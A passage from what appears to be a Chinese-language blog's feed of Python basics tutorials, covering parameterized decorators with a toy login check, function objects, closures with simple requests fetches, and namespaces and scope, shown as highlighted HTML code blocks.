class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">db_type</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deco</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">            name = input(<span class="string">&#x27;your name&gt;&gt;&gt;:&#x27;</span>).strip()</span><br><span class="line">            pwd = input(<span class="string">&#x27;your passwrod&gt;&gt;&gt;:&#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> db_type == <span class="string">&#x27;file&#x27;</span>:</span><br><span class="line">                print(<span class="string">&#x27;基于文本的验证&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> userfile:</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> userfile:</span><br><span class="line">                        username, password = user.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> name == username <span class="keyword">and</span> pwd == password:</span><br><span class="line">                            res = func(*args,**kwargs)</span><br><span class="line">                            <span class="keyword">return</span> res</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&#x27;your username or password error&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> db_type == <span class="string">&#x27;mysql&#x27;</span>:</span><br><span class="line">                print(<span class="string">&#x27;基于mysql的验证&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> db_type == <span class="string">&#x27;ldap&#x27;</span>:</span><br><span class="line">                print(<span class="string">&#x27;基于ldap的验证&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;不支持该验证方式&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> deco</span><br><span class="line"></span><br><span class="line"><span class="comment"># deco = auth(db_type=&#x27;file&#x27;)</span></span><br><span class="line"><span class="comment"># @deco</span></span><br><span class="line"><span class="meta">@auth(db_type=&#x27;file&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;index -&gt; %s:%s&#x27;</span> %(x,y))</span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@auth(db_type=&#x27;mysql&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;home -&gt; %s:%s&#x27;</span> %(x,y))</span><br><span class="line">home(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@auth(db_type=&#x27;ldap&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;transfer -&gt; %s:%s&#x27;</span> %(x,y))</span><br><span class="line">transfer(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>我们简化看一下这个代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">db_type</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deco</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> deco</span><br></pre></td></tr></table></figure><p>其实就是这么些东西，auth返回deco，deco返回wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth(db_type=&#x27;file&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;index -&gt; %s:%s&#x27;</span> %(x,y))</span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>运行<code>@auth(&#39;file&#39;)</code>等于<code>index = deco(index)</code> + <code>db_type = &#39;file&#39;</code>就等于<code>index = wrapper(1,2)</code> + <code>db_type = &#39;file&#39;</code></p><h2 id="第三层参数可以多个"><a href="#第三层参数可以多个" class="headerlink" title="第三层参数可以多个"></a>第三层参数可以多个</h2><p>装饰器为了参数<code>func</code>而套了两层，还需要参数的时候，为了语法糖套了第三层，但是第三层并没有被限制可以无限套娃，所以装饰器最多三层</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">db_type,canshu1,canshu2</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deco</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> deco</span><br><span class="line"><span class="meta">@auth(&#x27;file&#x27;,canshu1,canshu2) # 第三层可以无限套娃</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="有参装饰器模板"><a href="#有参装饰器模板" class="headerlink" title="有参装饰器模板"></a>有参装饰器模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 总结：有参装饰器的基本模板</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> 有参装饰器(<span class="params">x,y,z,....</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">outter</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">            <span class="comment"># 1.调用原函数</span></span><br><span class="line">            <span class="comment"># 2.为其增加新功能</span></span><br><span class="line">            res = func(*args,**kwargs)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> outter</span><br><span class="line"><span class="meta">@有参装饰器(x,y,z,....)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;from index&#x27;</span>)</span><br><span class="line">index()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19.python函数对象与闭包函数</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/19.python%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/19.python%E5%87%BD%E6%95%B0%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>关于闭包，即函数定义和函数表达式位于另一个函数的函数体内(嵌套函数)。而且，这些内部函数可以访问它们所在的外部函数中声明的所有局部变量、参数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包</p><a id="more"></a><hr><h1 id="函数对象"><a href="#函数对象" class="headerlink" title="函数对象"></a>函数对象</h1><p>精髓：把函数当成变量用(因为书写时多次运行所以案例返回的内存地址不相同)，也可以像变量一样当做函数参数或者函数返回值使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义函数其实是 func 指向 函数存储的内存地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;from func&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.可以赋值</span></span><br><span class="line">f = func <span class="comment"># 注意：没有括号(有括号是函数的返回值赋值给f)</span></span><br><span class="line">print(id(f),id(func)) <span class="comment"># 14645184 14645184 内存地址相同</span></span><br><span class="line">f() <span class="comment"># from func 也可以调用f函数,效果相同</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.可以把函数当做参数，把对应的内存地址传给另一个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">x</span>):</span></span><br><span class="line">    print(x) <span class="comment"># &lt;function func at 0x019677C0&gt;</span></span><br><span class="line">    x() <span class="comment"># from func 可以加括号执行</span></span><br><span class="line">foo(func) <span class="comment"># 其实传输的是函数的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.可以把函数当做另一个函数的返回值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">res = foo1(func)</span><br><span class="line">print(res) <span class="comment"># &lt;function func at 0x02208460&gt;</span></span><br><span class="line">res() <span class="comment"># from func</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.可以当做容器类型的元素</span></span><br><span class="line">l = [func,]</span><br><span class="line">l[<span class="number">0</span>]() <span class="comment"># from func</span></span><br><span class="line">dic = &#123;<span class="string">&#x27;k1&#x27;</span>:func&#125;</span><br><span class="line">dic[<span class="string">&#x27;k1&#x27;</span>]() <span class="comment"># from func</span></span><br></pre></td></tr></table></figure><h2 id="函数对象的案例"><a href="#函数对象的案例" class="headerlink" title="函数对象的案例"></a>函数对象的案例</h2><p>修改ATM登录案例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;登录功能&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;转账功能&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_banlance</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;查询余额&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catalogue</span>():</span></span><br><span class="line">    <span class="comment"># 读取func_dic来生成显示列表 -&gt; 方便程序后期快速修改</span></span><br><span class="line">    list = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> func_dic:</span><br><span class="line">        print(<span class="string">&#x27;&#123;&#125; -&gt; &#123;&#125;&#x27;</span>.format(list,func_dic[name][<span class="number">0</span>]))</span><br><span class="line">        list += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">func_dic = &#123;</span><br><span class="line">    <span class="comment"># 程序运行过程中只有读的需求所以用元组</span></span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>:(<span class="string">&#x27;退出&#x27;</span>,<span class="literal">None</span>), <span class="comment"># 为了规范格式使用None</span></span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:(<span class="string">&#x27;登录&#x27;</span>,login), <span class="comment"># 这里就是函数对象的应用</span></span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:(<span class="string">&#x27;转账&#x27;</span>,transfer),</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>:(<span class="string">&#x27;查询&#x27;</span>,check_banlance)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    catalogue() <span class="comment"># 显示列表</span></span><br><span class="line">    choic = input(<span class="string">&#x27;请输入命令编号:&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> choic.isdigit():</span><br><span class="line">        print(<span class="string">&#x27;输入有误&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> choic == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> choic <span class="keyword">in</span> func_dic:</span><br><span class="line">        func_dic[choic][<span class="number">1</span>]()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;输入有误&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="函数嵌套"><a href="#函数嵌套" class="headerlink" title="函数嵌套"></a>函数嵌套</h1><p>函数嵌套在名称空间的‘嵌套关系’里面已经介绍过了</p><p>函数嵌套本质目的是为了<strong>将大功能再次才分为多个小功能，再由大功能调用小功能</strong></p><h2 id="函数嵌套调用-在函数中调用其他函数"><a href="#函数嵌套调用-在函数中调用其他函数" class="headerlink" title="函数嵌套调用:在函数中调用其他函数"></a>函数嵌套调用:在函数中调用其他函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    func1() <span class="comment"># func函数中调用func1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func()</span><br></pre></td></tr></table></figure><p>案例:四个值查找最大值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;比较两个数大小&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a&lt;b:</span><br><span class="line">    <span class="comment"># not a&lt;b == a&gt;b and a == b</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max4</span>(<span class="params">a,b,c,d</span>):</span></span><br><span class="line">    res = max(a,b)</span><br><span class="line">    res = max(res,c)</span><br><span class="line">    res = max(res,d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">res = max4(<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h2 id="函数嵌套定义-在函数内定义其他函数"><a href="#函数嵌套定义-在函数内定义其他函数" class="headerlink" title="函数嵌套定义:在函数内定义其他函数"></a>函数嵌套定义:在函数内定义其他函数</h2><p>把f1当做容器，全局无法调用f2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="comment"># f2存在于f1的局部名称空间，只能在f1内调用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    f2()</span><br></pre></td></tr></table></figure><p>案例:求圆周面积</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span>(<span class="params">radius,action=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;求圆周长 (radius=半径长度，action=0求周长/1求面积)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> pi</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">perimiter</span>(<span class="params">radius</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*pi*radius</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span>(<span class="params">radius</span>):</span></span><br><span class="line">        <span class="keyword">return</span> pi*(radius**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> action==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> perimiter(radius)</span><br><span class="line">    <span class="keyword">elif</span> action==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> area(radius)</span><br><span class="line"></span><br><span class="line">res = circle(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><hr><h1 id="闭包函数"><a href="#闭包函数" class="headerlink" title="闭包函数"></a>闭包函数</h1><p>闭包函数=名称空间与作用域+函数嵌套+函数对象</p><h2 id="什么是闭包函数？"><a href="#什么是闭包函数？" class="headerlink" title="什么是闭包函数？"></a>什么是闭包函数？</h2><p>‘闭’：该函数是内嵌函数</p><p>‘包’：该函数包含对外层函数(不是全局函数)作用域名字的引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    x = <span class="number">333</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">        print(<span class="string">&#x27;函数f2:&#x27;</span>,x)</span><br><span class="line">    <span class="keyword">return</span> f2</span><br><span class="line">f = f1() <span class="comment"># 在全局拿到f2的内存地址</span></span><br><span class="line">print(f) <span class="comment"># &lt;function f1.&lt;locals&gt;.f2 at 0x00AF85C8&gt;</span></span><br><span class="line">f() <span class="comment"># 函数f2: 333</span></span><br></pre></td></tr></table></figure><p>使用函数对象的概念，将处于嵌套函数内部的f2函数变成了全局函数f</p><p>但，无论在哪儿调用f，都不会改变f的状态</p><h2 id="闭包案例"><a href="#闭包案例" class="headerlink" title="闭包案例"></a>闭包案例</h2><p>使用包requests(模仿浏览器进行http访问的模块)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>传参爬网站html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方案一:传参 - 通过参数方式为函数体传值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(response.text)</span><br><span class="line">get(<span class="string">&#x27;https://kinghtxg.github.io&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方案二:闭包 - 通过闭包的方式为函数体传值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url</span>():</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        print(response.text)</span><br><span class="line">    <span class="keyword">return</span> get_url</span><br><span class="line">baidu = get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">baidu()</span><br><span class="line">blog = get(<span class="string">&#x27;https://kinghtxg.github.io&#x27;</span>)</span><br><span class="line">blog()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18.python名词空间与作用域</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/18.python%E5%90%8D%E8%AF%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/18.python%E5%90%8D%E8%AF%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<p>名称空间(namespaces)顾名思义即存放名字与对象映射/绑定关系的地方，是对栈区的划分，在不同的空间中可以存放相同的名字，从而解决命名冲突的问题</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201129101428283.png" alt="image-20201129101428283"></p><p>作用域指的是名称所对应的有效范围，<strong>内置名称空间和全局名称空间</strong>在代码全局都能被使用，被称为全局作用域，而<strong>局部名称空间</strong>在函数内定义，就只能在当前函数使用，就被称为局部作用域</p><a id="more"></a><hr><h1 id="名称空间-namespaces"><a href="#名称空间-namespaces" class="headerlink" title="名称空间(namespaces)"></a>名称空间(namespaces)</h1><p>名称空间分为三种</p><h2 id="内置名称空间"><a href="#内置名称空间" class="headerlink" title="内置名称空间"></a>内置名称空间</h2><p>存放的名字：python解释器内置的名字</p><p>存活周期：python解释器启动则产生，python解释器关闭则销毁</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>max</span><br><span class="line">&lt;built-<span class="keyword">in</span> function max&gt; <span class="comment"># built-in内建</span></span><br></pre></td></tr></table></figure><h2 id="全局名称空间"><a href="#全局名称空间" class="headerlink" title="全局名称空间"></a>全局名称空间</h2><p>存放的名字：只要不是函数内定义并且不是内置的名字剩下的都是全局名称空间</p><p>存活周期：python文件执行时产生全局名称空间，运行代码到名字定义位置将名字放入空间，python文件运行完毕后销毁</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys <span class="comment"># 模块名sys</span></span><br><span class="line"></span><br><span class="line">x=<span class="number">1</span> <span class="comment"># 变量名x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">    y=<span class="number">2</span> <span class="comment"># 变量名y</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">x</span>):</span> <span class="comment"># 函数名foo</span></span><br><span class="line">    y=<span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span>():</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Class Bar: <span class="comment"># 类名Bar</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="局部名称空间"><a href="#局部名称空间" class="headerlink" title="局部名称空间"></a>局部名称空间</h2><p>存放的名字：在调用函数时，运行函数体代码过程中产生的函数内的名字</p><p>存活周期：调用函数时存活，函数调用完毕后销毁。</p><p>同一个函数调用多遍，调一次产生一个局部名称空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">x</span>):</span></span><br><span class="line">    y=<span class="number">3</span> <span class="comment"># 调用函数时，才会执行函数代码，名字x和y都存放于该函数的局部名称空间中</span></span><br></pre></td></tr></table></figure><h2 id="名称空间的加载销毁顺序"><a href="#名称空间的加载销毁顺序" class="headerlink" title="名称空间的加载销毁顺序"></a>名称空间的加载销毁顺序</h2><p>名称空间的加载顺序是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内置名称空间-&gt;全局名称空间-&gt;局部名称空间</span><br></pre></td></tr></table></figure><p>销毁顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">局部名称空间(函数结束销毁)-&gt;全局名称空间(文件关闭销毁)-&gt;内置名称空间(解释器关闭销毁)</span><br></pre></td></tr></table></figure><h2 id="名称空间的查找顺序"><a href="#名称空间的查找顺序" class="headerlink" title="名称空间的查找顺序"></a>名称空间的查找顺序</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/types_namespace-1.png" alt="img"></p><p>首先查找当前所在的空间，如果没有就向上一层一层查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">局部名称空间-&gt;全局名称空间-&gt;内置名称空间</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">print(input,int) 